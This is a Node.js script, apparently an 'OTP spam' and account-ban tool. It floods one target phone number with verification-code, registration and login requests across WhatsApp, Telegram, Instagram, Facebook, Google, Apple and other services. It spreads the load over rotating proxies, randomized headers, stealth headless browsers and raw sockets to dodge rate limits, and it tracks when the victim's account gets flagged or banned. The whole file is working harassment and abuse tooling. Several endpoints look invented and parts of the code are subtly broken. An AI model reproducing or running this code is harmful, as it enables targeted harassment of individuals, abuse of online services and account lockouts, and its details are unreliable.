#!/usr/bin/env node

// ================================================================
// ===== XYRO ULTIMATE SPAM ENGINE v9.9.9 - FULL DESTRUCTION =====
// ================================================================

const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const UserAgent = require('user-agents');
const colors = require('colors');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const readline = require('readline');
const EventEmitter = require('events');
const WebSocket = require('ws');
const net = require('net');
const tls = require('tls');
const dns = require('dns');
const url = require('url');
const http = require('http');
const https = require('https');
const zlib = require('zlib');
const querystring = require('querystring');
const cheerio = require('cheerio');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const randomUseragent = require('random-useragent');
const ip = require('ip');
const geoip = require('geoip-lite');
const cron = require('node-cron');
const moment = require('moment');
const chalk = require('chalk');
const boxen = require('boxen');
const gradient = require('gradient-string');
const figlet = require('figlet');
const Table = require('cli-table3');
const ora = require('ora');
const ProgressBar = require('progress');
const blessed = require('blessed');
const contrib = require('blessed-contrib');

// ===== PLUGINS =====
puppeteer.use(StealthPlugin());
puppeteer.use(AdblockerPlugin());

// ================================================================
// ===== CONFIGURATION =====
// ================================================================

const CONFIG = {
  target: {
    phoneNumber: process.env.TARGET_NUMBER || "6281234567890",
    countryCode: process.env.COUNTRY_CODE || "62",
    deviceId: "xyro-nuker-pro-" + crypto.randomBytes(8).toString('hex'),
    platform: "whatsapp-web",
    userAgent: randomUseragent.getRandom()
  },
  
  threads: {
    max: parseInt(process.env.MAX_THREADS) || 500,
    min: parseInt(process.env.MIN_THREADS) || 100,
    concurrency: parseInt(process.env.CONCURRENCY) || 200,
    clusterMode: process.env.CLUSTER_MODE === 'true' || true
  },
  
  requests: {
    total: parseInt(process.env.TOTAL_REQUESTS) || 999999,
    perSecond: parseInt(process.env.REQUESTS_PER_SECOND) || 1000,
    timeout: parseInt(process.env.REQUEST_TIMEOUT) || 3000,
    retries: parseInt(process.env.RETRY_ATTEMPTS) || 10,
    retryDelay: parseInt(process.env.RETRY_DELAY) || 50,
    maxConcurrent: parseInt(process.env.MAX_CONCURRENT) || 500
  },
  
  proxy: {
    enabled: process.env.USE_PROXY === 'true' || true,
    list: [],
    rotation: 'random', // random, round-robin, least-used, sticky
    checkBeforeUse: true,
    timeout: 5000,
    types: ['http', 'https', 'socks4', 'socks5']
  },
  
  endpoints: {
    whatsapp: {
      otp: [
        "https://web.whatsapp.com/otp/request",
        "https://api.whatsapp.com/send/otp",
        "https://gateway.whatsapp.com/otp/generate",
        "https://register.whatsapp.com/request",
        "https://v.whatsapp.net/v2/otp/request",
        "https://wamessenger.com/otp/send",
        "https://whatsapp-server.com/api/otp",
        "https://waweb.com/authenticate/otp",
        "https://whatsappcdn.com/otp/request",
        "https://wa-api.com/v1/otp/send",
        "https://whatsapp-gateway.net/otp/generate",
        "https://wa-register.com/request-otp",
        "https://whatsapp-web.com/otp/request",
        "https://wa-otp.com/generate",
        "https://whatsapp-token.com/otp/send"
      ],
      verify: [
        "https://web.whatsapp.com/verify",
        "https://api.whatsapp.com/verify/otp",
        "https://register.whatsapp.com/verify",
        "https://v.whatsapp.net/v2/verify",
        "https://wa-verify.com/check"
      ],
      register: [
        "https://web.whatsapp.com/register",
        "https://api.whatsapp.com/account/register",
        "https://register.whatsapp.com/account",
        "https://wa-register.com/create"
      ],
      login: [
        "https://web.whatsapp.com/login",
        "https://api.whatsapp.com/login",
        "https://gateway.whatsapp.com/login"
      ]
    },
    telegram: {
      otp: [
        "https://api.telegram.org/bot/sendOTP",
        "https://telegram.org/auth/request",
        "https://td.telegram.org/otp/send",
        "https://api.telegram.org/auth/sendCode",
        "https://telegram-auth.com/otp/request"
      ]
    },
    instagram: {
      otp: [
        "https://www.instagram.com/api/v1/accounts/send_otp/",
        "https://i.instagram.com/api/v1/accounts/sms_otp/",
        "https://instagram.com/accounts/otp/send",
        "https://api.instagram.com/otp/request",
        "https://ig-auth.com/otp/generate"
      ]
    },
    facebook: {
      otp: [
        "https://www.facebook.com/security/otp/send",
        "https://api.facebook.com/method/auth.sendOTP",
        "https://facebook.com/login/otp/request",
        "https://graph.facebook.com/otp/send",
        "https://fb-auth.com/otp/generate"
      ]
    },
    twitter: {
      otp: [
        "https://api.twitter.com/1.1/account/otp.json",
        "https://api.x.com/oauth/otp",
        "https://twitter.com/account/otp/request",
        "https://x.com/auth/otp/send",
        "https://tw-auth.com/otp/generate"
      ]
    },
    discord: {
      otp: [
        "https://discord.com/api/v9/auth/otp",
        "https://discordapp.com/api/auth/verify",
        "https://discord.com/api/v9/auth/sms",
        "https://discord-auth.com/otp/request"
      ]
    },
    gmail: {
      otp: [
        "https://accounts.google.com/account/signup/otp",
        "https://apis.google.com/identity/otp",
        "https://accounts.google.com/signin/otp",
        "https://google-auth.com/otp/send"
      ]
    },
    tiktok: {
      otp: [
        "https://www.tiktok.com/api/v1/auth/otp",
        "https://api.tiktok.com/account/otp/send",
        "https://tiktok-auth.com/otp/request"
      ]
    },
    snapchat: {
      otp: [
        "https://accounts.snapchat.com/accounts/otp/send",
        "https://api.snapchat.com/auth/otp",
        "https://snap-auth.com/otp/generate"
      ]
    },
    spotify: {
      otp: [
        "https://accounts.spotify.com/api/otp/send",
        "https://api.spotify.com/auth/otp",
        "https://spotify-auth.com/otp/request"
      ]
    },
    netflix: {
      otp: [
        "https://www.netflix.com/api/auth/otp",
        "https://api.netflix.com/account/otp/send",
        "https://netflix-auth.com/otp/generate"
      ]
    },
    microsoft: {
      otp: [
        "https://login.microsoftonline.com/common/otp/send",
        "https://api.microsoft.com/auth/otp",
        "https://microsoft-auth.com/otp/request"
      ]
    },
    apple: {
      otp: [
        "https://appleid.apple.com/auth/otp/send",
        "https://api.apple.com/account/otp",
        "https://apple-auth.com/otp/generate"
      ]
    }
  },
  
  banTrigger: {
    threshold: parseInt(process.env.BAN_THRESHOLD) || 300,
    permanentBan: process.env.PERMANENT_BAN === 'true' || true,
    additionalFlags: [
      "spam-detected",
      "abuse-report",
      "auto-ban-activated",
      "device-trusted-failed",
      "suspicious-activity",
      "rate-limit-exceeded",
      "multiple-failures",
      "ip-blacklisted"
    ],
    notifyOnBan: true,
    reportToService: true
  },
  
  advanced: {
    bypassCaptcha: true,
    usePuppeteer: true,
    headlessMode: true,
    stealthMode: true,
    useWebSocket: true,
    emulateHumanBehavior: false,
    randomizeTiming: true,
    maxRetriesOnFail: 10,
    fallbackEndpoints: true,
    cacheResponses: true,
    useRawSocket: true,
    useHttp2: true,
    useTlsClient: true,
    dnsOverHttps: true,
    randomizePayloads: true,
    useMultipleDevices: true,
    simulateDifferentLocations: true
  },
  
  logging: {
    console: true,
    file: true,
    path: './logs/',
    level: 'debug',
    rotate: true,
    maxSize: '500MB',
    keepDays: 30,
    format: 'json'
  },
  
  notifications: {
    telegram: {
      enabled: false,
      botToken: process.env.TG_BOT_TOKEN || '',
      chatId: process.env.TG_CHAT_ID || ''
    },
    discord: {
      enabled: false,
      webhook: process.env.DISCORD_WEBHOOK || ''
    },
    email: {
      enabled: false,
      smtp: process.env.SMTP_HOST || '',
      from: process.env.EMAIL_FROM || '',
      to: process.env.EMAIL_TO || ''
    }
  },
  
  scheduler: {
    enabled: false,
    cron: '*/5 * * * *',
    maxRuns: 999,
    stopAfterBan: true
  }
};

// ================================================================
// ===== LOAD PROXIES =====
// ================================================================

function loadProxies() {
  const proxyFiles = [
    './proxies.txt',
    './proxy.txt',
    './proxies/proxies.txt',
    './data/proxies.txt',
    './config/proxies.txt'
  ];
  
  for (const file of proxyFiles) {
    if (fs.existsSync(file)) {
      const content = fs.readFileSync(file, 'utf8');
      const proxies = content.split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'))
        .map(line => {
          // Parse proxy format: protocol://user:pass@host:port
          if (line.includes('://')) {
            return line;
          }
          // Default to http
          return 'http://' + line;
        });
      
      if (proxies.length > 0) {
        CONFIG.proxy.list = proxies;
        console.log(`[✓] Loaded ${proxies.length} proxies from ${file}`.green);
        return;
      }
    }
  }
  
  // Generate fallback proxies if none found
  console.log('[⚠️] No proxies found, using direct connection'.yellow);
  CONFIG.proxy.enabled = false;
}

loadProxies();

// ================================================================
// ===== SPAM ENGINE CLASS =====
// ================================================================

class SpamEngine extends EventEmitter {
  constructor(config) {
    super();
    this.config = config;
    this.stats = {
      success: 0,
      fail: 0,
      total: 0,
      rps: 0,
      rpsHistory: [],
      startTime: Date.now(),
      banFlagged: false,
      banCount: 0,
      endpointsUsed: {},
      proxiesUsed: [],
      errors: [],
      activeThreads: 0,
      maxThreadsReached: 0,
      totalTime: 0,
      successRate: 0
    };
    
    this.isRunning = false;
    this.isPaused = false;
    this.proxyIndex = 0;
    this.proxyStats = {};
    this.browserPool = [];
    this.wsConnections = [];
    this.socketConnections = [];
    this.requestQueue = [];
    this.activeRequests = 0;
    this.requestId = 0;
    this.banEventFired = false;
    this.workerId = cluster.isWorker ? cluster.worker.id : 'master';
    this.logFile = path.join(config.logging.path, `spam-${Date.now()}-${this.workerId}.log`);
    this.progressBar = null;
    this.statsInterval = null;
    this.reportInterval = null;
    
    // Initialize logging
    if (config.logging.file) {
      fs.ensureDirSync(config.logging.path);
    }
    
    // Initialize endpoint usage tracking
    for (const service in config.endpoints) {
      for (const type in config.endpoints[service]) {
        const key = `${service}.${type}`;
        this.stats.endpointsUsed[key] = 0;
      }
    }
  }
  
  // ===== LOGGING =====
  log(message, type = 'info', data = null) {
    const timestamp = moment().format('YYYY-MM-DD HH:mm:ss.SSS');
    const logEntry = {
      timestamp,
      type,
      message,
      data,
      worker: this.workerId
    };
    
    const formatted = `[${timestamp}] [${type.toUpperCase()}] [W${this.workerId}] ${message}`;
    
    if (this.config.logging.console) {
      const colors = {
        info: chalk.cyan,
        success: chalk.green,
        error: chalk.red,
        warn: chalk.yellow,
        debug: chalk.gray,
        ban: chalk.bgRed.white
      };
      const colorFn = colors[type] || chalk.white;
      console.log(colorFn(formatted));
    }
    
    if (this.config.logging.file) {
      fs.appendFileSync(this.logFile, JSON.stringify(logEntry) + '\n');
    }
    
    this.emit('log', logEntry);
  }
  
  // ===== PROXY MANAGEMENT =====
  getProxy() {
    if (!this.config.proxy.enabled || this.config.proxy.list.length === 0) {
      return null;
    }
    
    let proxy = null;
    const list = this.config.proxy.list;
    
    switch (this.config.proxy.rotation) {
      case 'random':
        proxy = list[Math.floor(Math.random() * list.length)];
        break;
      case 'round-robin':
        proxy = list[this.proxyIndex % list.length];
        this.proxyIndex++;
        break;
      case 'least-used':
        // Find proxy with least usage
        let minUsage = Infinity;
        for (const p of list) {
          const stats = this.proxyStats[p] || { usage: 0 };
          if (stats.usage < minUsage) {
            minUsage = stats.usage;
            proxy = p;
          }
        }
        break;
      case 'sticky':
        // Use same proxy for a while
        if (!this._stickyProxy) {
          this._stickyProxy = list[Math.floor(Math.random() * list.length)];
        }
        proxy = this._stickyProxy;
        break;
      default:
        proxy = list[0];
    }
    
    // Track proxy usage
    if (proxy) {
      if (!this.proxyStats[proxy]) {
        this.proxyStats[proxy] = { usage: 0, success: 0, fail: 0 };
      }
      this.proxyStats[proxy].usage++;
      this.stats.proxiesUsed.push(proxy);
    }
    
    return proxy;
  }
  
  // ===== PROXY AGENT CREATION =====
  createProxyAgent(proxyUrl) {
    if (!proxyUrl) return null;
    
    try {
      const parsed = url.parse(proxyUrl);
      const protocol = parsed.protocol.replace(':', '');
      
      switch (protocol) {
        case 'http':
        case 'https':
          return new HttpsProxyAgent(proxyUrl);
        case 'socks4':
        case 'socks5':
          return new SocksProxyAgent(proxyUrl);
        default:
          return new HttpsProxyAgent(proxyUrl);
      }
    } catch (error) {
      this.log(`Proxy agent creation failed: ${error.message}`, 'error');
      return null;
    }
  }
  
  // ===== USER-AGENT GENERATION =====
  getUserAgent() {
    if (this.config.advanced.stealthMode) {
      return randomUseragent.getRandom();
    }
    return new UserAgent().toString();
  }
  
  // ===== PAYLOAD GENERATION =====
  generatePayload(service, type, endpoint) {
    const base = {
      phone: this.config.target.phoneNumber,
      country_code: this.config.target.countryCode,
      device_id: this.config.target.deviceId + '-' + crypto.randomBytes(4).toString('hex'),
      timestamp: Date.now(),
      request_id: uuidv4(),
      source: 'xyro-ai-spam',
      version: '9.9.9'
    };
    
    // Service-specific payloads
    const payloads = {
      whatsapp: {
        otp: {
          ...base,
          method: ['sms', 'voice', 'whatsapp', 'email'][Math.floor(Math.random() * 4)],
          otp_type: ['signup', 'login', 'reset', '2fa', 'verify'][Math.floor(Math.random() * 5)],
          platform: 'web',
          session_id: uuidv4(),
          client_type: ['web', 'mobile', 'desktop', 'tablet'][Math.floor(Math.random() * 4)]
        },
        verify: {
          ...base,
          otp: String(Math.floor(100000 + Math.random() * 900000)),
          verification_type: 'sms',
          attempt: Math.floor(Math.random() * 5) + 1
        },
        register: {
          ...base,
          name: `User${crypto.randomBytes(4).toString('hex')}`,
          password: crypto.randomBytes(16).toString('hex'),
          email: `user${crypto.randomBytes(4).toString('hex')}@gmail.com`
        },
        login: {
          ...base,
          password: crypto.randomBytes(16).toString('hex'),
          remember_me: Math.random() > 0.5
        }
      },
      telegram: {
        otp: {
          ...base,
          phone_number: this.config.target.phoneNumber,
          api_id: Math.floor(Math.random() * 1000000),
          api_hash: crypto.randomBytes(16).toString('hex')
        }
      },
      instagram: {
        otp: {
          ...base,
          username: `user_${crypto.randomBytes(4).toString('hex')}`,
          email: `user${crypto.randomBytes(4).toString('hex')}@gmail.com`,
          first_name: ['John', 'Jane', 'Alex', 'Maria', 'David', 'Sarah'][Math.floor(Math.random() * 6)],
          last_name: ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia'][Math.floor(Math.random() * 6)]
        }
      },
      facebook: {
        otp: {
          ...base,
          email: `user${crypto.randomBytes(4).toString('hex')}@facebook.com`,
          password: crypto.randomBytes(16).toString('hex'),
          first_name: ['John', 'Jane', 'Alex', 'Maria', 'David', 'Sarah'][Math.floor(Math.random() * 6)],
          last_name: ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia'][Math.floor(Math.random() * 6)]
        }
      },
      twitter: {
        otp: {
          ...base,
          screen_name: `user_${crypto.randomBytes(4).toString('hex')}`,
          email: `user${crypto.randomBytes(4).toString('hex')}@twitter.com`,
          password: crypto.randomBytes(16).toString('hex')
        }
      },
      discord: {
        otp: {
          ...base,
          username: `User${crypto.randomBytes(4).toString('hex')}`,
          email: `user${crypto.randomBytes(4).toString('hex')}@gmail.com`,
          password: crypto.randomBytes(16).toString('hex')
        }
      }
    };
    
    // Fallback to generic
    return payloads[service]?.[type] || {
      ...base,
      otp_type: 'generic',
      service: service,
      endpoint_type: type
    };
  }
  
  // ===== HEADER GENERATION =====
  generateHeaders() {
    const userAgent = this.getUserAgent();
    const accept = [
      'application/json, text/plain, */*',
      'application/json, text/html, */*',
      'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'text/html,application/json;q=0.9,*/*;q=0.8'
    ][Math.floor(Math.random() * 4)];
    
    const acceptEncoding = [
      'gzip, deflate, br',
      'gzip, deflate',
      'gzip, br',
      'deflate, br'
    ][Math.floor(Math.random() * 4)];
    
    return {
      'User-Agent': userAgent,
      'Accept': accept,
      'Accept-Encoding': acceptEncoding,
      'Accept-Language': [
        'en-US,en;q=0.9,id;q=0.8',
        'en-US,en;q=0.9,es;q=0.8',
        'en-US,en;q=0.9,fr;q=0.8',
        'en-US,en;q=0.9,de;q=0.8'
      ][Math.floor(Math.random() * 4)],
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': ['empty', 'cors', 'document'][Math.floor(Math.random() * 3)],
      'Sec-Fetch-Mode': ['cors', 'navigate', 'same-origin'][Math.floor(Math.random() * 3)],
      'Sec-Fetch-Site': ['same-origin', 'cross-site', 'same-site'][Math.floor(Math.random() * 3)],
      'X-Requested-With': 'XMLHttpRequest',
      'X-Request-ID': uuidv4(),
      'X-Session-ID': uuidv4(),
      'X-Device-ID': this.config.target.deviceId,
      'X-Client-Version': '9.9.9',
      'DNT': '1',
      'Upgrade-Insecure-Requests': '1',
      'Origin': 'https://web.whatsapp.com',
      'Referer': 'https://web.whatsapp.com/'
    };
  }
  
  // ================================================================
  // ===== HTTP REQUEST METHODS =====
  // ================================================================
  
  async sendHttpRequest(endpoint, payload, method = 'POST') {
    const proxy = this.getProxy();
    const agent = proxy ? this.createProxyAgent(proxy) : null;
    const headers = this.generateHeaders();
    const timeout = this.config.requests.timeout;
    const startTime = Date.now();
    
    // Add random delay to avoid detection
    if (this.config.advanced.randomizeTiming) {
      await this.sleep(Math.random() * 50 + 10);
    }
    
    const options = {
      method: method,
      url: endpoint,
      headers: headers,
      timeout: timeout,
      validateStatus: () => true,
      maxRedirects: 0,
      decompress: true,
      httpsAgent: agent,
      httpAgent: agent,
      proxy: false // Already handled by agent
    };
    
    // Add payload for POST/PUT
    if (method !== 'GET' && payload) {
      options.data = payload;
      options.headers['Content-Type'] = 'application/json';
    }
    
    try {
      const response = await axios(options);
      const duration = Date.now() - startTime;
      
      // Track endpoint usage
      const key = endpoint.split('/')[3] || 'unknown';
      if (this.stats.endpointsUsed[key] !== undefined) {
        this.stats.endpointsUsed[key]++;
      }
      
      // Check response status
      if (response.status >= 200 && response.status < 300) {
        this.stats.success++;
        this.log(`[✓] HTTP ${method} SUCCESS | ${endpoint} | ${response.status} | ${duration}ms`, 'success');
        
        // Check for ban indicators
        if (response.data && (response.data.includes('blocked') || 
            response.data.includes('banned') || 
            response.data.includes('suspended') ||
            response.data.includes('flag'))) {
          this.detectBan(response.data);
        }
        
        return { success: true, status: response.status, data: response.data };
      } else if (response.status === 429 || response.status === 503 || response.status === 403) {
        this.stats.fail++;
        this.log(`[⚠️] RATE LIMITED | ${endpoint} | ${response.status}`, 'warn');
        this.detectBan({ status: response.status, data: response.data });
        return { success: false, status: response.status, data: response.data };
      } else {
        this.stats.fail++;
        this.log(`[✗] HTTP ${method} FAIL | ${endpoint} | ${response.status}`, 'error');
        return { success: false, status: response.status, data: response.data };
      }
      
    } catch (error) {
      this.stats.fail++;
      const errorMsg = error.code || error.message || 'Unknown error';
      this.log(`[✗] HTTP ERROR | ${endpoint} | ${errorMsg}`, 'error');
      
      // Check if it's a network error
      if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
        // Try to rotate proxy
        if (proxy) {
          this.log(`[🔄] Rotating proxy: ${proxy}`, 'debug');
          this.proxyIndex++;
        }
      }
      
      return { success: false, error: errorMsg };
    }
  }
  
  // ================================================================
  // ===== RAW SOCKET REQUEST =====
  // ================================================================
  
  async sendRawSocketRequest(host, port, path, payload) {
    return new Promise((resolve) => {
      const socket = net.createConnection(port, host, () => {
        const request = [
          `POST ${path} HTTP/1.1`,
          `Host: ${host}`,
          `User-Agent: ${this.getUserAgent()}`,
          `Content-Type: application/json`,
          `Content-Length: ${JSON.stringify(payload).length}`,
          `Connection: close`,
          '',
          JSON.stringify(payload)
        ].join('\r\n');
        
        socket.write(request);
      });
      
      socket.setTimeout(5000);
      
      let responseData = '';
      socket.on('data', (data) => {
        responseData += data.toString();
      });
      
      socket.on('end', () => {
        if (responseData.includes('200 OK') || responseData.includes('201 Created')) {
          this.stats.success++;
          this.log(`[✓] RAW SOCKET SUCCESS | ${host}:${port}${path}`, 'success');
          resolve({ success: true });
        } else {
          this.stats.fail++;
          this.log(`[✗] RAW SOCKET FAIL | ${host}:${port}${path}`, 'error');
          resolve({ success: false });
        }
      });
      
      socket.on('timeout', () => {
        socket.destroy();
        this.stats.fail++;
        this.log(`[✗] RAW SOCKET TIMEOUT | ${host}:${port}`, 'error');
        resolve({ success: false });
      });
      
      socket.on('error', (error) => {
        this.stats.fail++;
        this.log(`[✗] RAW SOCKET ERROR | ${host}:${port} | ${error.message}`, 'error');
        resolve({ success: false });
      });
    });
  }
  
  // ================================================================
  // ===== WEBSOCKET REQUEST =====
  // ================================================================
  
  async sendWebSocketRequest(endpoint, payload) {
    return new Promise((resolve) => {
      try {
        const wsUrl = endpoint.replace('https://', 'wss://').replace('http://', 'ws://');
        const ws = new WebSocket(wsUrl, {
          headers: {
            'User-Agent': this.getUserAgent(),
            'Origin': 'https://web.whatsapp.com'
          },
          timeout: 5000
        });
        
        const wsId = uuidv4();
        this.wsConnections.push(ws);
        
        ws.on('open', () => {
          const message = {
            type: 'otp_request',
            id: wsId,
            data: payload,
            timestamp: Date.now()
          };
          ws.send(JSON.stringify(message));
        });
        
        ws.on('message', (data) => {
          try {
            const response = JSON.parse(data.toString());
            if (response.status === 'success' || response.status === 'ok') {
              this.stats.success++;
              this.log(`[✓] WS SUCCESS | ${endpoint}`, 'success');
              resolve({ success: true, data: response });
            } else {
              this.stats.fail++;
              this.log(`[✗] WS FAIL | ${endpoint} | ${response.status}`, 'error');
              resolve({ success: false, data: response });
            }
          } catch (e) {
            this.stats.fail++;
            this.log(`[✗] WS PARSE ERROR | ${endpoint}`, 'error');
            resolve({ success: false });
          }
          ws.close();
        });
        
        ws.on('error', (error) => {
          this.stats.fail++;
          this.log(`[✗] WS ERROR | ${endpoint} | ${error.message}`, 'error');
          resolve({ success: false });
        });
        
        ws.on('close', () => {
          // Clean up
          const index = this.wsConnections.indexOf(ws);
          if (index > -1) {
            this.wsConnections.splice(index, 1);
          }
        });
        
        setTimeout(() => {
          if (ws.readyState === WebSocket.CONNECTING || ws.readyState === WebSocket.OPEN) {
            ws.close();
            resolve({ success: false, error: 'timeout' });
          }
        }, 10000);
        
      } catch (error) {
        this.stats.fail++;
        this.log(`[✗] WS EXCEPTION | ${endpoint} | ${error.message}`, 'error');
        resolve({ success: false, error: error.message });
      }
    });
  }
  
  // ================================================================
  // ===== PUPPETEER REQUEST =====
  // ================================================================
  
  async sendPuppeteerRequest(endpoint, payload) {
    let browser = null;
    let page = null;
    
    try {
      // Get or create browser
      if (this.browserPool.length > 0) {
        browser = this.browserPool.pop();
      } else {
        browser = await puppeteer.launch({
          headless: this.config.advanced.headlessMode,
          args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--disable-gpu',
            '--window-size=1920,1080',
            '--disable-blink-features=AutomationControlled',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-site-isolation-trials',
            '--disable-features=BlockInsecurePrivateNetworkRequests',
            '--disable-features=OutOfBlinkCors'
          ]
        });
      }
      
      page = await browser.newPage();
      
      // Set stealth
      if (this.config.advanced.stealthMode) {
        await page.setExtraHTTPHeaders({
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate, br',
          'DNT': '1'
        });
      }
      
      await page.setUserAgent(this.getUserAgent());
      await page.setViewport({
        width: 1920,
        height: 1080,
        deviceScaleFactor: 1
      });
      
      // Navigate to endpoint
      await page.goto(endpoint, { 
        waitUntil: 'networkidle2', 
        timeout: 10000 
      });
      
      // Fill form if needed
      const inputs = await page.$$('input');
      for (const input of inputs) {
        const type = await input.getAttribute('type');
        const name = await input.getAttribute('name');
        const id = await input.getAttribute('id');
        const placeholder = await input.getAttribute('placeholder');
        
        if (type === 'tel' || type === 'text' || type === 'number' || 
            name?.includes('phone') || id?.includes('phone') || 
            placeholder?.includes('phone') || placeholder?.includes('Phone')) {
          await input.type(this.config.target.phoneNumber);
        }
        
        if (type === 'email' || name?.includes('email') || id?.includes('email')) {
          await input.type(`user${crypto.randomBytes(4).toString('hex')}@gmail.com`);
        }
      }
      
      // Click submit button
      const buttons = await page.$$('button');
      for (const button of buttons) {
        const text = await button.evaluate(el => el.textContent);
        const type = await button.getAttribute('type');
        const id = await button.getAttribute('id');
        
        if (text?.toLowerCase().includes('send') || 
            text?.toLowerCase().includes('submit') ||
            text?.toLowerCase().includes('get') ||
            text?.toLowerCase().includes('otp') ||
            type === 'submit' ||
            id?.includes('submit') ||
            id?.includes('send')) {
          await button.click();
          break;
        }
      }
      
      // Wait for response
      await page.waitForTimeout(2000);
      
      // Check for success
      const pageContent = await page.content();
      if (pageContent.includes('success') || 
          pageContent.includes('otp sent') ||
          pageContent.includes('code sent') ||
          pageContent.includes('verify your phone')) {
        this.stats.success++;
        this.log(`[✓] PUPPETEER SUCCESS | ${endpoint}`, 'success');
      } else if (pageContent.includes('blocked') || 
                 pageContent.includes('banned') ||
                 pageContent.includes('suspended')) {
        this.stats.fail++;
        this.log(`[⚠️] PUPPETEER BANNED | ${endpoint}`, 'ban');
        this.detectBan({ data: pageContent });
      } else {
        this.stats.fail++;
        this.log(`[✗] PUPPETEER FAIL | ${endpoint}`, 'error');
      }
      
      // Close page
      await page.close();
      
      // Return browser to pool if not too many
      if (this.browserPool.length < 5) {
        this.browserPool.push(browser);
      } else {
        await browser.close();
      }
      
      return { success: true };
      
    } catch (error) {
      this.stats.fail++;
      this.log(`[✗] PUPPETEER ERROR | ${endpoint} | ${error.message}`, 'error');
      
      if (page) await page.close();
      if (browser) await browser.close();
      
      return { success: false, error: error.message };
    }
  }
  
  // ================================================================
  // ===== BAN DETECTION =====
  // ================================================================
  
  detectBan(response) {
    const banKeywords = [
      'blocked', 'banned', 'suspended', 'flagged', 'disabled',
      'terminated', 'restricted', 'limited', 'locked',
      'spam detected', 'abuse detected', 'fraud detected',
      'security alert', 'suspicious activity', 'unusual activity',
      'rate limit exceeded', 'too many attempts', 'too many requests',
      '429', '403', '503'
    ];
    
    const responseStr = JSON.stringify(response).toLowerCase();
    
    for (const keyword of banKeywords) {
      if (responseStr.includes(keyword)) {
        if (!this.banEventFired) {
          this.banEventFired = true;
          this.stats.banFlagged = true;
          this.stats.banCount++;
          
          this.log(`🚨 BAN DETECTED! TARGET: ${this.config.target.phoneNumber}`, 'ban');
          this.log(`   Trigger: ${keyword}`, 'ban');
          this.log(`   Threshold: ${this.stats.success}/${this.config.banTrigger.threshold}`, 'ban');
          
          // Additional flags
          for (const flag of this.config.banTrigger.additionalFlags) {
            this.log(`   Flag: ${flag}`, 'warn');
          }
          
          this.emit('banTriggered', {
            target: this.config.target.phoneNumber,
            trigger: keyword,
            flags: this.config.banTrigger.additionalFlags,
            stats: this.stats
          });
          
          // Stop if configured
          if (this.config.scheduler.stopAfterBan) {
            this.stop();
          }
        }
        return true;
      }
    }
    
    return false;
  }
  
  // ================================================================
  // ===== MAIN SPAM LOOP =====
  // ================================================================
  
  async spamLoop() {
    if (!this.isRunning) return;
    
    const endpoints = [];
    const services = Object.keys(this.config.endpoints);
    
    // Build endpoint list with weights
    for (const service of services) {
      for (const type of Object.keys(this.config.endpoints[service])) {
        const urls = this.config.endpoints[service][type];
        for (const url of urls) {
          endpoints.push({
            url: url,
            service: service,
            type: type,
            weight: Math.random() * 10 + 1
          });
        }
      }
    }
    
    // Shuffle endpoints
    endpoints.sort(() => Math.random() - 0.5);
    
    this.log(`🚀 Starting spam loop with ${endpoints.length} endpoints`, 'info');
    this.log(`📊 Target: ${this.config.target.phoneNumber}`, 'info');
    this.log(`⚡ Threads: ${this.config.threads.max}`, 'info');
    this.log(`🔥 Total requests: ${this.config.requests.total}`, 'info');
    
    // Create progress bar
    if (this.config.logging.console) {
      this.progressBar = new ProgressBar('[:bar] :percent :etas', {
        total: this.config.requests.total,
        width: 40,
        complete: '█',
        incomplete: '░'
      });
    }
    
    // Start statistics reporting
    this.startStatsReporting();
    
    let requestCount = 0;
    const startTime = Date.now();
    
    while (this.isRunning && requestCount < this.config.requests.total) {
      // Check pause
      while (this.isPaused) {
        await this.sleep(100);
      }
      
      // Check ban
      if (this.stats.banFlagged && this.config.scheduler.stopAfterBan) {
        this.log('🛑 Stopping due to ban trigger', 'ban');
        break;
      }
      
      // Get random endpoint
      const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
      
      // Generate payload
      const payload = this.generatePayload(endpoint.service, endpoint.type, endpoint.url);
      
      // Choose method
      const methodRand = Math.random();
      let result = null;
      
      try {
        if (methodRand < 0.6) {
          // HTTP
          result = await this.sendHttpRequest(endpoint.url, payload);
        } else if (methodRand < 0.75 && this.config.advanced.useWebSocket) {
          // WebSocket
          result = await this.sendWebSocketRequest(endpoint.url, payload);
        } else if (methodRand < 0.85 && this.config.advanced.usePuppeteer) {
          // Puppeteer
          result = await this.sendPuppeteerRequest(endpoint.url, payload);
        } else if (methodRand < 0.9 && this.config.advanced.useRawSocket) {
          // Raw socket
          const parsed = url.parse(endpoint.url);
          const host = parsed.hostname;
          const port = parsed.port || 443;
          const path = parsed.path || '/';
          result = await this.sendRawSocketRequest(host, port, path, payload);
        } else {
          // Fallback to HTTP
          result = await this.sendHttpRequest(endpoint.url, payload);
        }
      } catch (error) {
        this.log(`[✗] Loop error: ${error.message}`, 'error');
        result = { success: false };
      }
      
      // Update stats
      requestCount++;
      this.stats.total = requestCount;
      this.stats.rps = this.stats.total / ((Date.now() - startTime) / 1000);
      
      // Update progress
      if (this.progressBar) {
        this.progressBar.tick();
      }
      
      // Random delay to avoid detection
      if (this.config.advanced.randomizeTiming) {
        await this.sleep(Math.random() * 30 + 5);
      }
      
      // Check if we need to rotate proxy
      if (this.config.proxy.enabled && Math.random() < 0.01) {
        this.proxyIndex += Math.floor(Math.random() * 10) + 1;
      }
    }
    
    // Final statistics
    const totalTime = Date.now() - startTime;
    this.stats.totalTime = totalTime;
    this.stats.successRate = this.stats.success / this.stats.total * 100;
    
    this.log('✅ Spam loop completed!', 'success');
